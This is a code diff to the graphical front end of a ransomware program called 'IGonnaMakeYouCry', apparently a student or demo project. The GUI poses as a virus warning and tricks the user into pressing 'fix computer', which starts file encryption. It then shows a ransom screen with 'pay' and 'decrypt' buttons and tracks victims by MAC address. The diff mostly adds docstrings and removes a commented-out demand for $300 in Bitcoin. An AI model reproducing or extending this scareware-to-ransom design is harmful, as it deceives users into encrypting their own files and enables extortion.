@@ -12,7 +12,7 @@ import sys
 #pyinstaller --onefile --hidden-import=tkinter  GUI.py
 #pip3 install Pillow
 
-#Saeki path ad myndinni shield. Tharf ad gera thar sem vid gerum eine executable skra.
+#Only used to find shild image on run time. Because of single executable.
 bundle_dir = getattr(sys, '_MEIPASS', path.abspath(path.dirname(__file__)))
 path_to_dat = path.join(bundle_dir, 'shield.png')
 
@@ -22,11 +22,14 @@ class GUI:
 
 
     def __init__(self):
+        """
+        Loads "you have a virus" if the computer has not been encrypted
+        else loads "your computer has been encrypted".
+        """
         self.window = None
         self.keyManager = KeyManager()
         self.ransom = Ransom()
 
-        
 
         if(self.keyManager.isEncrypted(get_mac())):
             self.loadEncrypted()
@@ -34,15 +37,23 @@ class GUI:
             self.loadYouHaveVirus()
 
 
-
     def pay(self):
+        """
+        Is called when "pay" is pressed in UI.
+        Calls method in keyManager to pay and shows a dialog.
+        """
         self.keyManager.pay(get_mac())
         messagebox.showinfo('Thanks','Thanks you for the payment.')
 
     def decrypt(self):
+        """
+        Is called when "decrypt" is pressed in UI.
+        If it has been payed, it starts decrypting and shows a dialog when done.
+        If it has not been payed it gives a warning that it has not been payed.
+        """
         try:
             self.ransom.startDecryption()
-            self.keyManager.removeThisMacFromDB() #Temp svo thad tharf ekki ad eyda ut ur gagnagrunni manual.
+            self.keyManager.removeThisMacFromDB() #So it is possible to run the application multiple times.
             messagebox.showinfo('Decrypted','Everything has been decrypted.')
             sys.exit()
         except Exception as error:
@@ -52,6 +63,11 @@ class GUI:
 
 
     def encrypt(self):
+        """
+        Is called when "fix computer" is pressed in UI.
+        Calles method in ransom to start encryption.
+        Changes UI with text to indicate that the program is working.
+        """
         lbl = Label(self.window, text="Cleaning, please wait...", font=('Helvetica 12 bold', 15))
         lbl.grid(column=0, row=1)
         self.window.update()
@@ -62,29 +78,19 @@ class GUI:
 
 
     def loadEncrypted(self):
+        """
+        Load  everything has been encrypted.
+        """
         self.window = Tk()
 
         self.window.title("IGonnaMakeYouCry")
         self.window.geometry('500x400')
         self.window.configure(background = 'firebrick')
 
-
-        #lbl = Label(self.window, text="Ooops, your computer is infected. Press button to fix.")
-        #Grid.columnconfigure(self.window, 0, weight=1)
-        #lbl.grid(row=0,column = 0, pady=10)
-
         lbl = Label(self.window, text="Woops, looks like you are in trouble!", bg = 'gold', fg = 'black', font='Helvetica 12 bold')
         Grid.columnconfigure(self.window, 0, weight=1)
         Grid.columnconfigure(self.window, 1, weight=1)
         lbl.grid(row=0,column = 0, pady=10, columnspan=2)
-
-        """Woops, looks like you are in trouble!
-What the hell just happened?
--  Some of your files have been encrypted.
-Can I get my files back?
-- Yes, but it will cost you. You will need to pay 300$ worth of Bitcoins in order to decrypt your files. Once you have payed you need to press the "Decrypt" button and your files will be decrypted.
-How do I pay?
-- Simple, just press the pay button down below."""
 
 
         t = Text(self.window,width=60, height=15, bg = 'gold')
@@ -110,6 +116,10 @@ How do I pay?
 
 
     def loadYouHaveVirus(self):
+        """
+        Load you have a virus UI.
+        """
+
         self.window = Tk()
 
         self.window.title("Virus Detected")
